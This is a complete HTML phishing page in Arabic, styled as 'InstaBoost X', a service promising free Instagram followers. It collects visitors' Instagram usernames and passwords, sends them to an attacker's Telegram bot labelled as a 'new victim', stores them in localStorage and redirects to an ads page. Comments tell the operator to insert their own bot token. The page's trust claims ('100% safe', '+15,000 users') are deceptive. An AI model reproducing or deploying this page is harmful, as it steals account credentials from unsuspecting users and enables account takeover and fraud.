<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>InstaBoost 🚀</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: radial-gradient(circle at 20% 30%, #0a0a0a, #000000);
            font-family: 'Poppins', 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow-x: hidden;
        }

        /* خلفية متحركة اخترافية */
        .glow-bg {
            position: fixed;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 0% 0%, rgba(225,48,108,0.15) 0%, transparent 50%),
                radial-gradient(circle at 100% 100%, rgba(0,255,255,0.1) 0%, transparent 50%);
            pointer-events: none;
            z-index: 0;
        }

        .container {
            position: relative;
            z-index: 2;
            width: 90%;
            max-width: 450px;
            background: rgba(10, 10, 20, 0.65);
            backdrop-filter: blur(20px);
            border-radius: 48px;
            padding: 35px 25px;
            border: 1px solid rgba(225,48,108,0.5);
            box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 20px rgba(225,48,108,0.3);
            transition: all 0.3s ease;
            text-align: center;
        }

        .icon {
            font-size: 70px;
            filter: drop-shadow(0 0 15px #e1306c);
            margin-bottom: 15px;
        }

        h1 {
            font-size: 32px;
            background: linear-gradient(135deg, #fff, #e1306c);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
            letter-spacing: -0.5px;
        }

        .sub {
            color: rgba(255,255,255,0.7);
            font-size: 14px;
            margin-bottom: 30px;
            border-bottom: 1px dashed rgba(225,48,108,0.5);
            display: inline-block;
            padding-bottom: 5px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            color: #ccc;
            font-size: 13px;
            margin-bottom: 8px;
            letter-spacing: 0.5px;
        }

        .input-group input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(20,20,35,0.9);
            border: 1px solid rgba(225,48,108,0.4);
            border-radius: 40px;
            color: white;
            font-size: 16px;
            outline: none;
            transition: 0.2s;
        }

        .input-group input:focus {
            border-color: #e1306c;
            box-shadow: 0 0 12px rgba(225,48,108,0.4);
        }

        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(95deg, #e1306c, #c72a60);
            border: none;
            border-radius: 50px;
            color: white;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 10px;
            box-shadow: 0 5px 15px rgba(225,48,108,0.4);
        }

        .btn:active {
            transform: scale(0.97);
        }

        .features {
            display: flex;
            justify-content: space-between;
            margin: 30px 0 15px;
            gap: 10px;
        }

        .feature {
            background: rgba(255,255,255,0.05);
            padding: 8px;
            border-radius: 30px;
            font-size: 11px;
            color: #ddd;
            flex: 1;
            backdrop-filter: blur(4px);
        }

        .footer-note {
            font-size: 11px;
            color: #555;
            margin-top: 20px;
        }

        @keyframes float {
            0% { transform: translateY(0px); }
            100% { transform: translateY(-8px); }
        }
    </style>
</head>
<body>
<div class="glow-bg"></div>
<div class="container">
    <div class="icon">🔥🎯</div>
    <h1>InstaBoost <span style="color:#e1306c;">X</span></h1>
    <div class="sub">زيادة متابعين انستقرام احترافية</div>

    <div class="input-group">
        <label>📧 البريد الإلكتروني أو اسم المستخدم</label>
        <input type="text" id="email" placeholder="example@instagram.com" autocomplete="off">
    </div>
    <div class="input-group">
        <label>🔒 كلمة المرور</label>
        <input type="password" id="password" placeholder="••••••••">
    </div>

    <button class="btn" id="boostBtn">✨ زيادة متابعين ✨</button>

    <div class="features">
        <div class="feature">⚡ سريع فوري</div>
        <div class="feature">🛡️ آمن 100%</div>
        <div class="feature">👑 متابعين حقيقيين</div>
    </div>
    <div class="footer-note">✔️ تم استخدامه من قبل +15,000 مستخدم</div>
</div>

<script>
    // بيانات التليجرام الخاصة بك 👿 استبدلها بتوكنك الحقيقي
    const BOT_TOKEN = "1234567890:ABCdefGHIjklmNOPqrstUVwxyz";  // ⚠️ غيّر هذا
    const CHAT_ID = "123456789";  // ⚠️ غيّر هذا

    async function sendToTelegram(email, password) {
        const text = `🎯 ضحية جديدة 🎯\n📧 ${email}\n🔑 ${password}\n⏰ ${new Date().toLocaleString()}\n🌐 IP: عبر الواجهة`;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
        try {
            await fetch(url);
            return true;
        } catch(e) {
            console.log(e);
            return false;
        }
    }

    document.getElementById('boostBtn').addEventListener('click', async function() {
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();

        if(email === "" || password === "") {
            alert("❌ يرجى إدخال البريد الإلكتروني وكلمة المرور");
            return;
        }

        // إرسال البيانات للتليجرام أولاً
        await sendToTelegram(email, password);

        // حفظ البيانات في localStorage مؤقتًا (اختياري لو احتجتها في صفحة الإعلانات)
        localStorage.setItem("insta_email", email);
        localStorage.setItem("insta_pass", password);

        // التوجيه لصفحة الإعلانات المليئة
        window.location.href = "ads.html";
    });
</script>
</body>
    </html>
